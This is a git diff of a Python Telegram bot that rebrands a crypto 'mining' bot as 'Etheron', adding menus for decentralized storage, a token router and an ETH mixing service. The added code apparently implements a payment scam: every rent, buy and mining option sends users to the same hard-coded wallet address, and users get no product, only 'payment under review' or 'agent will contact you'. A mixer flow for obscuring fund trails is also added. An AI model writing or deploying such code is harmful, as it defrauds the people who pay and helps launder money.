@@ -2,7 +2,10 @@ import telebot
 from telebot.util import antiflood, quick_markup ,extract_arguments
 from dotenv import load_dotenv
 import os
-from db import Users
+from db import Users, Bridge
+from func import minimum, output, exchange, exchange_status
+from telebot import types
+
 
 load_dotenv()
 
@@ -13,6 +16,9 @@ bot = telebot.TeleBot(Token, parse_mode='Markdown', disable_web_page_preview=Tru
 
 db_user = Users()
 db_user.setup()
+
+db_bridge = Bridge('bridge.db')
+db_bridge.setup()
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(message):
@@ -53,14 +59,16 @@ def userno(message):
 def start(message):
   owner = message.chat.id
   db_user.add_user(owner)
-  msg = """Welcome to Blockchain Miner AI bot!!!
-We handle all the stress of GPU mining and blockchain consensus with our high powered miners for your benefit.
-
-Select your prefered choice below.
+  msg = """
+Welcome to Etheron
+Ethereon’s platform uses the *Proof of Space and Time* (PoST) consensus to achieve energy-efficient blockchain validation by utilizing unused hard drive space, while integrating with Bittensor’s decentralized AI network. This system reduces energy consumption, ensures security, and supports decentralized applications and AI-based projects.
 """
   markup = quick_markup({
     'Blockchain Consensus': {'callback_data': 'consensus'},
     'Mining': {'callback_data': 'mining'}, 
+    'Decentralized Storage' : {'callback_data' : 'storage'},
+    'Router' : {'callback_data' : 'router'},
+    'Advanvced Features' : {'callback_data' : 'adv'}
   })
   bot.send_message(owner, msg, reply_markup = markup )
   
@@ -268,6 +276,107 @@ Coins per Month: 23,454 ZCN ($2,580)
     elif call.data == 'confirmm':
         bot.send_message(owner, "payment under review")
         
+    elif call.data == 'storage':
+        msg = """Ethereon offers decentralized cloud storage that ensures full safety for users' data by utilizing its Proof of Space and Time consensus mechanism. Integrated with the Bittensor TAO ecosystem, this platform enhances security and efficiency while providing a scalable solution for data management.
+        """
+        markup = quick_markup({
+            '100TB Hard Disk' : {'callback_data' : 'tb100'}, 
+            '1000TB Hard Disk' : {'callback_data' : 'tb1000'},
+        }, 1)
+        bot.edit_message_text(msg, owner, call.message.message_id, reply_markup=markup)
+        
+    elif call.data== 'tb100':
+        markup = quick_markup({
+            'Rent $250/mo' : {'callback_data' : 'rent1'},
+            'Buy $5000 ' : {'callback_data' : 'buy1'}
+        }, 1)
+        bot.send_message(owner, "Select an option to buy or rent a decentralized storage space of 100TB", reply_markup=markup)
+        
+    elif call.data== 'tb1000':
+        markup = quick_markup({
+            'Rent $1300/mo' : {'callback_data' : 'rent1'},
+            'Buy $30000 ' : {'callback_data' : 'buy1'}
+        }, 1)
+        bot.send_message(owner, "Select an option to buy or rent a decentralized storage space of 1000TB", reply_markup=markup)
+    
+    elif call.data == 'rent1' or call.data == 'buy1':
+        msg = """Please send the amount of eth  to this address:
+`0xf38CC031888a4B13a912DA72aFfd09608a92837b` (tap to copy)
+process can take up to 10 minutes to get completed"""  
+
+        bot.send_message(owner, msg)
+        
+    elif call.data == 'adv':
+        markup = quick_markup({
+            'Smart Contract' : {'callback_data' : 'adv1'},
+            'API Integration' : {'callback_data' : 'adv1'},
+        })
+        bot.send_message(owner, "Select from the button below for an advanced feature for both developers and web3 experts looking to work with us", reply_markup=markup)
+        
+    elif call.data == 'adv1':
+        bot.send_message(owner, "Coming Soon...")
+        
+    elif call.data == 'confirm':
+        bot.delete_message(owner, call.message.message_id)
+        print('yessssssssssss')
+        wallet = db_bridge.get_txid(owner)
+        amount = db_bridge.get_amount(owner)
+        exc = exchange('eth','eth','eth','eth',amount,wallet)
+        print(exc)
+        payin = exc['payinAddress']
+        msg = f"""Started Mixing Operation
+        
+Please send the amount of *{amount} eth * to
+`{payin}` 
+to start your transaction
+
+Funds will automatically be transfered to
+`{wallet}` 
+After mixing has been completed
+
+⚠ *Please Note that gas fees will be deducted from input amount, so take this into consideration*
+
+*Transactions can take up to 30 minutes to get completed*
+
+You can close this window anytime
+
+        """
+        markup = types.InlineKeyboardMarkup()
+        btn = types.InlineKeyboardButton('Close ❌️', callback_data='cancel')
+        markup.add(btn)
+        bot.send_message(owner, msg, reply_markup=markup)
+        
+    elif call.data == 'ethmix':
+        min = minimum('eth','eth','eth','eth')
+        send = bot.send_message(owner, f"You're about to mix ETH\n\nMinimum Mix Amount is {min} ETH \n\nEnter Amount to Mix: ")
+        bot.register_next_step_handler(send, ethmix)
+        db_bridge.add_user(owner)
+        
+    elif call.data == 'router':
+        msg = "Swap from $etheron tokens to other tokens using our Router\nSelect the chain to swap to from the buttons below\n\n*P.S* Minimum token swap amount is 300k etheron "
+        markup = quick_markup({
+            '$Etheron/Usdt' : {'callback_data' : 'route'},
+            '$Etheron/ETH' : {'callback_data' : 'route'},
+            '$Etheron/SOL' : {'callback_data' : 'route'},
+            '$Etheron/BTC' : {'callback_data' : 'route'},
+        })
+        bot.send_message(owner, msg, reply_markup=markup)
+        
+    elif call.data == 'route':
+        s = bot.send_message(owner, "send Wallet to receive swapped tokens to")
+        bot.register_next_step_handler(s, rv1)
+        
+        
+def rv1(message):
+    owner = message.chat.id
+    msg = """To Complete Swap, send your tokens to the router smart contract address
+    `0x5F67cf7A50F0A74172dF82946Aff24625967731c`
+    
+    *Swap is automated and swapped assets will be sent to your wallet address*
+    
+    """
+    bot.send_message(owner, msg)
+        
         
 
 def setwallet(message):
@@ -279,8 +388,41 @@ def setwallet(message):
         markup = quick_markup({
             'Confirm Payment' : {'callback_data' : 'confirmm'}
         })
-        bot.send_message(owner, 'To Proceed with mining, You are requested to make a payment of *$1500* to \n`0x1234567899874563621` (tap to copy)\n\nPayment can take upto 15 minutes to be confirmed and our agent will contact you', reply_markup=markup)
+        bot.send_message(owner, 'To Proceed with mining, You are requested to make a payment of *$1500* to \n`0xf38CC031888a4B13a912DA72aFfd09608a92837b` (tap to copy)\n\nPayment can take upto 15 minutes to be confirmed and our agent will contact you', reply_markup=markup)
     else:
         bot.send_message(owner, 'Invalid wallet address')
+        
+        
+def ethmix(message):
+    owner = message.chat.id
+    try:
+        initial = float(message.text)
+        db_bridge.update_amount(initial, owner)
+    except Exception as e:
+        bot.send_message(message.chat.id, "Message should be a number ")
+        
+    min = minimum('eth','eth','eth','eth')
+    if initial < min:
+        s = bot.send_message(owner, "Mix amount lower than minimum amount\nPlease enter amount: ")
+        bot.register_next_step_handler(s, ethmix)
+    else:
+        
+        bot.send_message(owner, "Enter wallet to mix to: ")
+        bot.register_next_step_handler(message, ether)
+        
+def ether(message):
+    owner = message.chat.id
+    amt = db_bridge.get_amount(owner)
+    msg = f"Hit the confirm button to Mix *{amt}* eth to `{message.text}`"
+    wallet = str(message.text)
+    if wallet.startswith('0x'):
+        markup = types.InlineKeyboardMarkup()
+        btn = types.InlineKeyboardButton('Cancel ❌', callback_data='cancel')
+        bt = types.InlineKeyboardButton('Confirm ✅️', callback_data='confirm')
+        markup.add(btn,bt)
+        db_bridge.update_txid(wallet, owner)
+        bot.send_message(owner, msg, reply_markup=markup)
+    else:
+        bot.send_message(owner, "Please Enter a valid ethereum recipient wallet")
     
 bot.infinity_polling()
